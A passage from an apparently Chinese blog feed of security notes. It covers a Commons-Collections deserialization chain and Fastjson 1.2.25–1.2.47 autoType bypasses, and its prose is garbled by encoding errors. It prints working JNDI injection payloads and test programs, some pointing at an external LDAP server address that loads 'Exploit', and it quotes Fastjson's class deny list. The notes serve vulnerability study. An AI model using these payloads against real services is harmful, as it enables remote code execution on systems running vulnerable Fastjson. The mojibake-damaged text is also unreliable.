class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,</span><br><span class="line">                        Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap1.put(<span class="string">&quot;pP&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap2.put(<span class="string">&quot;oo&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;pP&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transforms);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 1.2.25&amp;42&amp;43&amp;45&amp;47</title>
    <link href="https://bowuchuling.github.io/posts/1uyhgiuj.html"/>
    <id>https://bowuchuling.github.io/posts/1uyhgiuj.html</id>
    <published>2024-03-28T11:27:53.662Z</published>
    <updated>2024-03-28T11:30:02.164Z</updated>
    
    <content type="html"><![CDATA[<h1>Fastjson 1.2.25&amp;42&amp;43&amp;45&amp;47</h1><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326102224599.png" alt="image-20240326102224599"></p><p>åœ¨ç‰ˆæœ¬ 1.2.25 ä¸­ï¼Œå®˜æ–¹å¯¹ä¹‹å‰çš„ååºåˆ—åŒ–æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œå¼•å…¥äº† checkAutoType å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ autoTypeSupport å…³é—­ï¼Œä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»ï¼Œè€Œæ‰“å¼€ AutoType ä¹‹åï¼Œæ˜¯åŸºäºå†…ç½®é»‘åå•æ¥å®ç°å®‰å…¨çš„ï¼Œfastjson ä¹Ÿæä¾›äº†æ·»åŠ é»‘åå•çš„æ¥å£ã€‚</p><p><strong>com.alibaba.fastjson.parser.ParserConfig</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325194400099.png" alt="image-20240325194400099"></p><p>ä½œè€…åœ¨è¿™é‡Œå¢åŠ äº†autoTypeSupportå’Œé»‘åå•</p><p>å…¶ä¸­é»‘åå• denyList åŒ…æ‹¬ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>æ·»åŠ ååºåˆ—åŒ–ç™½åå•æœ‰3ç§æ–¹æ³•ï¼š</p><ol><li>ä½¿ç”¨ä»£ç è¿›è¡Œæ·»åŠ ï¼š<code>ParserConfig.getGlobalInstance().addAccept(â€œorg.chu0.fastjson.,org.javaweb.â€)</code></li><li>åŠ ä¸ŠJVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=org.chu0.fastjson.</code></li><li>åœ¨fastjson.propertiesä¸­æ·»åŠ ï¼š<code>fastjson.parser.autoTypeAccept=org.chu0.fastjson.</code></li></ol><p>æ³¨æ„ä¸‹é¢è¿™ä¸ªéƒ¨åˆ†ï¼Œè¿™æ˜¯æœ¬æ¬¡æ›´æ–°ä¸»è¦æ›´æ–°çš„waféƒ¨åˆ†DefaultJSONParser.class#parseObject</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325195533854.png" alt="image-20240325195533854"></p><p>æˆ‘ä»¬è·Ÿè¿›checkAutoTypeè¿›è¡Œåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325195811642.png" alt="image-20240325195811642"></p><p>è¿™é‡Œç”±äºæˆ‘å¹¶æ²¡æœ‰å¼€å¯autoTypeSupportï¼Œæ‰€ä»¥ä¸¤å±‚falseç›´æ¥è·³è¿‡äº†é»‘ç™½åå•çš„æ£€æŸ¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325200027354.png" alt="image-20240325200027354"></p><p>å¦‚æœåœ¨é»‘åå•éƒ¨åˆ†çš„è¯ï¼Œä¸‹é¢å°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œç»“æŸç¨‹åºï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325200424189.png" alt="image-20240325200424189"></p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:9999/a\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONObject.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:9999/a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å¿…é¡»å¼€å¯AutoType-ç»•è¿‡">å¿…é¡»å¼€å¯AutoType ç»•è¿‡</h2><h3 id="fj-1-2-42">fj &lt; 1.2.42</h3><p>ä¸»åŠ¨å¼€å¯AutoTypeSupport</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1225</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:9999/a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼Œç”±äºè¿™é‡Œæ²¡æœ‰é…ç½®æœåŠ¡ç«¯ï¼Œæ‰€ä»¥æ²¡æœ‰ä»»ä½•ååº”</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325202131037.png" alt="image-20240325202131037"></p><p>å¯ä»¥å‘ç°åœ¨è¿™é‡Œcom.sun.rowset.JdbcRowSetImplå‰é¢å¢åŠ äº†ä¸€ä¸ªå­—æ¯L,åé¢å¢åŠ äº†ä¸€ä¸ªåˆ†å·ï¼Œä¸ºä»€ä¹ˆè¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†å‘¢ï¼Œä¸”çœ‹ä¸‹é¢åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325202454639.png" alt="image-20240325202454639"></p><p>ç”±äºåœ¨å‰é¢å¢åŠ äº†ä¸€ä¸ªå­—æ¯Lï¼Œæ‰€ä»¥å°±å¯ä»¥ç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ï¼Œè¿›å…¥åˆ°ä¸Šé¢çš„TypeUtils.loadClassæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥ç»§ç»­åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325203738111.png" alt="image-20240325203738111"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325203824483.png" alt="image-20240325203824483"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹å‰é¢çš„Lå’Œåé¢çš„;éƒ½è¿›è¡Œäº†å¤„ç†ï¼Œæœ€åå†æ¬¡è°ƒç”¨loadClassæ–¹æ³•ï¼Œæ˜¯å¯ä»¥ç»•è¿‡çš„</p><h3 id="1-2-42-fj-1-2-43">1.2.42&lt;=fj&lt;1.2.43</h3><p>42ä¹‹åçš„ç‰ˆæœ¬åœ¨æ£€æŸ¥checkAutoTypeä¹‹å‰å¯¹ç±»åè¿›è¡Œäº†æˆªå–å‰åå„ä¸€ä¸ªå­—ç¬¦çš„æ“ä½œï¼Œè¯¦è§ä¸‹é¢å¯¹æ¯”</p><p>æ­¤å›¾ä¸º1.2.47ç‰ˆæœ¬ï¼Œä¸‹é¢é‚£ä¸€ä¸²æ•°å­—æ˜¯å› ä¸º42ç‰ˆæœ¬åå¯¹äºç±»åçš„è¡¨ç¤ºéƒ½å˜æˆäº†å¯¹åº”çš„hashå€¼</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326105123966.png" alt="image-20240326105123966"></p><p>æ­¤å›¾ä¸º1.2.25</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326105231000.png" alt="image-20240326105231000"></p><p>æˆ‘ä»¬å¯ä»¥æ˜æ˜¾å‘ç°åœ¨if (this.autoTypeSupport || expectClass != null) {}ä¹‹å‰å¢åŠ äº†éƒ¨åˆ†ä»£ç ï¼Œå…·ä½“æ•ˆæœå°±æ˜¯æˆªå–ç±»å1åˆ°length-1çš„éƒ¨åˆ†ï¼ˆå»æ‰å‰åå„ä¸€ä¸ªå­—ç¬¦ï¼‰ï¼Œåº”å¯¹æ–¹æ³•ä¹Ÿååˆ†ç®€å•ï¼ŒåŒå†™å³å¯ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1242</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fj-1-2-43">fj &lt; 1.2.43</h3><p>æˆ‘ä»¬ç»§ç»­è¿è¡Œä¹‹å‰çš„payloadï¼Œå‘ç°ç›´æ¥æŠ¥é”™äº†ï¼Œä¸‹é¢å°†ä¼šè¿›è¡Œæ–­ç‚¹åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111056498.png" alt="image-20240326111056498"></p><p>å‘ç°å¼‚å¸¸éƒ¨åˆ†å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111141831.png" alt="image-20240326111141831"></p><p>è¿™æ®µå…¶å®å°±æ˜¯å¯¹Lå¼€å¤´;ç»“å°¾çš„ç±»åè¿›è¡Œäº†wafï¼Œæ‰€ä»¥åé¢çš„ç»•è¿‡å°±ä¸èƒ½ç”¨L&amp;;äº†ï¼Œè·Ÿè¸ªä¸‹é¢çš„TypeUtils.loadClassè¿›è¡Œåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111523730.png" alt="image-20240326111523730"></p><p>å¯¹äºç±»åçš„ç»•è¿‡ä¸åªæ˜¯L&amp;;ï¼Œ[ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨è¿›è¡Œç»•è¿‡ï¼Œè¡ç”Ÿå‡ºå¦‚ä¸‹payload</p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1243</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fj-1-4-45">fj &lt; 1.4.45</h3><p>éœ€è¦æ­é…mybatis3ä½¿ç”¨</p><p><strong>mybatis3 &lt;=3.4.6</strong></p><p>å…·ä½“å…¥å£å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326115759125.png" alt="image-20240326115759125"></p><p>fjåœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨å¯¹åº”æˆå‘˜å˜é‡çš„getteræˆ–è€…setteræ–¹æ³•ï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨æ­¤å¤„çš„lookupæ–¹æ³•ï¼Œè¿›è€Œè§¦å‘JNDIæ³¨å…¥ï¼Œå¯¹äºjndiè¿˜ä¸ç†Ÿæ‚‰çš„å¸ˆå‚…å»ºè®®ä»1.2.24å¼€å§‹å­¦èµ·ï¼Œjndiå¯ä»¥è¯´æ˜¯è´¯ç©¿å¾ˆå¤šç‰ˆæœ¬çš„fj</p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1245</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;, \&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;&#125;&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="fj-1-2-47é€šæ€"><strong>fj &lt;= 1.2.47</strong>é€šæ€</h2><p><strong>fj &lt;= 1.2.47</strong>é€šæ€</p><p>æ‰€è°“é€šæ€ï¼Œå°±æ˜¯ä¸ç®¡æ˜¯å¦å¼€å¯AutoTypeéƒ½å¯ä»¥æ‰§è¡Œ</p><p><strong>@typeæ˜¯Classç±»æ—¶ä¼šåŠ è½½valå¯¹åº”çš„ç±»å¹¶å†™å…¥ç¼“å­˜</strong></p><ul><li>å…³é—­äº†autoTypeSupportè‚¯å®šè¿›ä¸å»ç™½åå•æŸ¥æ‰¾ï¼Œåˆç”±äºMappingä¸ºç©ºå°±è¿›å…¥findClass</li><li>å¼€å¯äº†autoTypeSupportåœ¨ç™½åå•ä¹Ÿæ‰¾ä¸åˆ°Classç±»ï¼ˆé»˜è®¤ç™½åå•ä¸ºç©ºï¼‰ï¼Œä¹Ÿä¼šæœ€ç»ˆè¿›å…¥findClass</li></ul><h3 id="å¼€å¯AutoTypeåˆ†æ">å¼€å¯AutoTypeåˆ†æ</h3><p>è¿›å…¥checkAutoTypeï¼Œç”±äºclazzä¸ºç©ºï¼Œæ‰€ä»¥ä¼šè¿›å…¥ä¸‹é¢çš„ç¬¬ä¸€ä¸ªåˆ¤æ–­</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205306719.png" alt="image-20240326205306719"></p><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­å¹¶æ²¡æœ‰è¿”å›clazzï¼Œæ‰€ä»¥ä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬æ–­ç‚¹è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205549027.png" alt="image-20240326205549027"></p><p>IdentifyHashMapå­˜äº†å¾ˆå¤šåŸºç¡€ç±»ï¼ŒåŒ¹é…åˆ°ç›´æ¥è¿”å›ï¼Œè¿™é‡Œå°±æ˜¯åŒ¹é…åˆ°äº†&quot;java.lang.Class&quot;</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205709132.png" alt="image-20240326205709132"></p><p>è¿”å›ä¸Šå±‚å‡½æ•°ï¼Œå°±å¯ä»¥å‘ç°è¿™é‡Œå°†clazz returnäº†ï¼Œè¿”å›DefaultJSONParser#parseObjectæ–¹æ³•ï¼Œå¹¶è¿›å…¥äº†deserializer.deserialzeæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205817596.png" alt="image-20240326205817596"></p><p>æˆ‘ä»¬ç»§ç»­æ–­ç‚¹è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213137003.png" alt="image-20240326213137003"></p><p>æ­¤å¤„å¯¹objValè¿›è¡Œäº†èµ‹å€¼ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213326910.png" alt="image-20240326213326910"></p><p>åœ¨266è¡Œå¯¹strValè¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œæœ€åæ˜¯é‡å¤´æˆ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213405415.png" alt="image-20240326213405415"></p><p>ç”±äºæ­¤å¤„çš„clazzå¹¶ä¸ä¸ºç©ºï¼Œæ‰€ä»¥æ‰§è¡Œäº†ä¸‹é¢çš„loadClassï¼Œå¯¹äºstrValç±»è¿›è¡Œäº†åŠ è½½ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213655825.png" alt="image-20240326213655825"></p><p>å¯ä»¥å‘ç°loadClasså¼€å¯äº†ç¼“å­˜ï¼Œå¹¶åœ¨1153è¡Œå°†valçš„å€¼å†™å…¥äº†ç¼“å­˜</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213853548.png" alt="image-20240326213853548"></p><p>å½“å†æ¬¡è¿›å…¥checkAutoTypeçš„æ—¶å€™ï¼Œæ­¤æ—¶çš„tyoeNameå°±æ˜¯com.sun.rowset.JdbcRowSetImpl</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326214238747.png" 